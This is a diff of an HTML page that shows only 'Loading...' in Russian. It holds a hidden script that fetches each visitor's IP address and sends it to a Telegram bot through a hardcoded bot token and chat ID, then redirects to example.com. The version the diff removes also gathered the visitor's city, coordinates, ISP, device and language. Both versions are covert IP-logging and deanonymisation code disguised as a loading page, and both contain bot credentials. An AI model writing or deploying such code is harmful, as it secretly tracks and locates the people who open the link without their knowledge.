@@ -7,59 +7,25 @@
 <body>
     <h1>Загрузка...</h1>
     <script>
-        window.onload = function() {
-            // 1. Получаем реальный IP
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    var ip = data.ip;
-                    // 2. Получаем геоданные по IP
-                    return fetch('http://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org')
-                        .then(res => res.json())
-                        .then(geo => {
-                            return { ip, geo };
-                        });
-                })
-                .then(data => {
-                    var ip = data.ip;
-                    var geo = data.geo;
-                    var ua = navigator.userAgent;
-                    var lang = navigator.language;
-                    var time = new Date().toLocaleString('ru-RU');
-                    var device = /iPhone|iPad|Android/i.test(ua) ? '📱 Мобильное устройство' : '💻 Компьютер';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => {
+                var ip = d.ip;
+                var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
+                var chat_id = "8212240529";
+                var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=IP: " + ip;
+                fetch(url).catch(function() {});
+            })
+            .catch(function() {
+                var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
+                var chat_id = "8212240529";
+                var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=IP: ne opredelen";
+                fetch(url).catch(function() {});
+            });
 
-                    var text = "🔹 НОВЫЙ ПЕРЕХОД 🔹\n" +
-                               "IP: " + ip + "\n" +
-                               "Страна: " + (geo.country || '—') + "\n" +
-                               "Регион: " + (geo.regionName || '—') + "\n" +
-                               "Город: " + (geo.city || '—') + "\n" +
-                               "Координаты: " + (geo.lat || '—') + ", " + (geo.lon || '—') + "\n" +
-                               "Провайдер: " + (geo.isp || '—') + "\n" +
-                               "Организация: " + (geo.org || '—') + "\n" +
-                               "Устройство: " + device + "\n" +
-                               "Язык: " + lang + "\n" +
-                               "Время: " + time;
-
-                    var token = "8984823205:AAHz862DzTswOfq4HqT74EHMYl1apCoiXAg";
-                    var chat_id = "8212240529";
-                    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
-                    fetch(url).catch(function() {});
-                })
-                .catch(function() {
-                    // Если не получилось определить IP
-                    var ip = window.location.hostname;
-                    var text = "IP (домен): " + ip + "\nНе удалось определить реальный IP.";
-                    var token = "8984823205:AAHz862DzTswOfq4HqT74EHMYl1apCoiXAg";
-                    var chat_id = "8212240529";
-                    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
-                    fetch(url).catch(function() {});
-                });
-
-            // Перенаправление через 3 секунды
-            setTimeout(function() {
-                window.location.href = "https://example.com";
-            }, 3000);
-        };
+        setTimeout(function() {
+            window.location.href = "https://example.com";
+        }, 2000);
     </script>
 </body>
 </html>
